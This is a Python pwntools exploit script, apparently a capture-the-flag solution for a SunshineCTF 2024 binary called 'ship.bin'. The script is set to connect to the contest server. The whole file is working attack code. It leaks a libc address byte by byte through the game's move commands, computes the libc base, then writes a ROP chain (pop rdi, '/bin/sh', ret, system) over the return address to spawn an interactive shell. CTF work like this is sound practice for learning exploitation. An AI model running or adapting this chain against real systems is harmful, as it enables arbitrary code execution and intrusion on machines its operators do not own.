#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./ship.bin_patched")
libc = ELF("./libc_chall.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("2024.sunshinectf.games", 24003)

    return r


def move(x: int, y: int, c: bytes) -> tuple[int]:
    r.sendlineafter(b">>> ", str(x).encode("ascii"))
    r.sendlineafter(b">>> ", str(y).encode("ascii"))
    r.sendlineafter(b">>> ", b"C")
    r.sendlineafter(b">>> ", c)

    if c == b"A":
        match = re.match(rb".+ 0x(.+) from (..) .+", r.recvline(4))
        address = int(match.group(1), 16)
        value = int(match.group(2), 16)
        return address, value
    else:
        return (0, 0)


# NOTE: It's correct but after `system` is executed the program crashes
def main():
    r = conn()

    leak = []

    # `__libc_start_main` is at coordinates (43, 8) while return address is at (33, 8)
    for idx in range(8):
        _, val = move(43, 8 + idx, b"A")
        leak.append(val)

    libc.address = u64(bytes(leak)) - (libc.sym.__libc_start_main + 139)
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    log.info(f"libc @ 0x{libc.address:x}")


    for idx in range(8):
        move(33, 8 + idx, p64(libc.address + 0x10f75b)[idx].to_bytes(1, "little"))    # "pop rdi; ret" instruction

    for idx in range(8):
        move(34, idx, p64(bin_sh)[idx].to_bytes(1, "little"))

    for idx in range(8):
        move(34, 8 + idx, p64(libc.address + 0x116f94)[idx].to_bytes(1, "little"))    # "ret" instruction

    for idx in range(8):
        move(35, idx, p64(libc.sym.system)[idx].to_bytes(1, "little"))

    print("FINISHING...")

    # Finish the game (it looks ugly but who cares)
    is_finished = False
    for x in range(16):
        for y in range(16):
            print(x, y)
            move(x, y, b"T")

            if b"Congratulations!" in r.recvlines(4)[-1]:
                is_finished = True
                break
        if is_finished: break

    r.interactive("$ ")


if __name__ == "__main__":
    main()
